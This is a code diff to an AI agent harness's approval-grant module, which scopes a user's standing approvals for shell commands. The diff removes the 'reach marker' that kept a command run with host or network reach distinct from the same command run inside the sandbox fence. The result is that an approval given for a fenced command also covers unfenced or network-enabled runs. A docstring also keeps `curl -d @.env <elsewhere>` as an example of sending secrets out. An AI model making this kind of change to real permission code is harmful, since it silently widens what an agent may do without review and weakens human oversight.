@@ -12,10 +12,8 @@ Other tools take a whole-tool grant.
 
 **Words are matched whole, under the same fence.** :func:`covered_by_grant` refuses two
 widenings: prefix matching (a yes to a bare `env` would cover everything beneath it), and
-the same words under a different fence (a redirect or environment value outside the
-worktree, or a wider declared ``reach``, decides whether ``tools/shell.py`` confines the
-process). Both tests apply when a scope is recorded too, so a scope that could never match
-is never written.
+the same words naming a path outside the worktree. Both tests apply when a scope is
+recorded too, so a scope that could never match is never written.
 
 **One whole-tool grant on a command-running tool is written deliberately.** A scheduled
 task's ``pre_authorized`` list (``harness/manifests/tasks.py``) seeds one per tool name;
@@ -49,18 +47,14 @@ from models.approval_grant import ApprovalGrant
 from services.permissions import (
     OPERATOR_ONLY_TOOLS,
     GrantWidth,
-    capability_of,
     command_prefixes,
-    declared_reach,
 )
 from services.permissions.guards import is_guarded
 
 #: Literals because ``services/`` sits below ``tools/``; ``tests/test_approval_grants.py``
 #: pins the set against the catalog's so a new executing tool cannot inherit a whole-tool
 #: grant.
-COMMAND_SCOPED_TOOLS = frozenset(
-    {"shell_run_command", "shell_start_command", "code_run_host_command"}
-)
+COMMAND_SCOPED_TOOLS = frozenset({"shell_run_command", "shell_start_command", "shell_run_on_host"})
 
 _COMMAND_ARGUMENT = "command"
 
@@ -127,33 +121,26 @@ def grant_scopes(tool_name: str, args: Mapping[str, object]) -> list[tuple[str, 
     worktree: no grant is recorded, since a whole-tool fallback would give those commands
     exactly the standing yes this scoping withholds.
 
-    A reach wider than the tool's own is part of the scope (:func:`_reach_marker`); at Auto
-    the only shell calls that park declare ``host`` or ``network``, so refusing them would
-    leave "allow for this conversation" nothing to apply to.
     """
     if tool_name not in COMMAND_SCOPED_TOOLS:
         return [()]
-    scopes = _scopes_of(tool_name, args)
+    scopes = _scopes_of(args)
     if scopes is None:
         return None
     # Deduplicated, order preserved: `git add . && git commit` is one act named twice.
     return list(dict.fromkeys(scopes))
 
 
-def _scopes_of(tool_name: str, args: Mapping[str, object]) -> list[tuple[str, ...]] | None:
-    """Every scope this call's command line names, or None when it names none.
+def _scopes_of(args: Mapping[str, object]) -> list[tuple[str, ...]] | None:
+    """Every scope this call's command line names (one per pipeline stage), or None.
 
-    One per pipeline stage, each led by the reach marker where the reach is wider than the
-    tool's own. Shared by recording and matching so the two read a command identically.
+    Shared by recording and matching so the two read a command identically.
     """
     command = args.get(_COMMAND_ARGUMENT)
     if not isinstance(command, str):
         return None
     prefixes = command_prefixes(command)
-    if not prefixes:
-        return None
-    marker = _reach_marker(tool_name, args)
-    return [(*marker, *prefix) for prefix in prefixes]
+    return list(prefixes) if prefixes else None
 
 
 def grant_width(
@@ -176,9 +163,8 @@ def grant_width(
     include flags (:func:`services.permissions.command_prefixes`), so a yes to `curl -sS
     <url>` does not stand for `curl -d @.env <elsewhere>`.
 
-    Nothing covers a command the grammar could not read, one naming a path outside the
-    worktree, or one declaring a reach wider than its tool's own; the last two take the
-    same words outside the fence.
+    Nothing covers a command the grammar could not read or one naming a path outside the
+    worktree.
     """
     if tool_name is None or tool_name in ONCE_ONLY_TOOLS:
         return "none"
@@ -188,7 +174,7 @@ def grant_width(
     whole_tool = [grant for grant in on_tool if not grant.command_prefix]
     if whole_tool:
         return "tool" if any(grant.decisive for grant in whole_tool) else "command"
-    called = _scopes_of(tool_name, args)
+    called = _scopes_of(args)
     if not called:
         return "none"
     scopes = [grant.command_prefix for grant in on_tool]
@@ -207,26 +193,6 @@ def covered_by_grant(
     matters where a *review* decides (:func:`grant_width`, which this reads).
     """
     return grant_width(tool_name, args, grants) != "none"
-
-
-def _reach_marker(tool_name: str, args: Mapping[str, object]) -> tuple[str, ...]:
-    """The word a scope leads with when the call declared a reach wider than its tool's own.
-
-    ``reach`` is the model's argument on the executing shell tools and decides the fence:
-    ``host`` runs unwrapped, ``network`` opens egress. The marker makes a command run with
-    the fence off a different scope from the same words fenced, in both directions.
-
-    Spelled ``@host`` so it cannot collide with a program name. It is absent where the
-    reach equals the tool's own default (the answer with no arguments): `code_run_host_command`
-    reaches the host by construction, so marking it would add nothing.
-    """
-    reach = declared_reach(tool_name, dict(args))
-    # A command that runs with network is marked ``network`` whichever reach the model wrote.
-    if reach == "offline" and capability_of(tool_name, args).runs_with_network:
-        reach = "network"
-    if reach is None or reach == declared_reach(tool_name, {}):
-        return ()
-    return (f"@{reach}",)
 
 
 class ApprovalGrantStore:
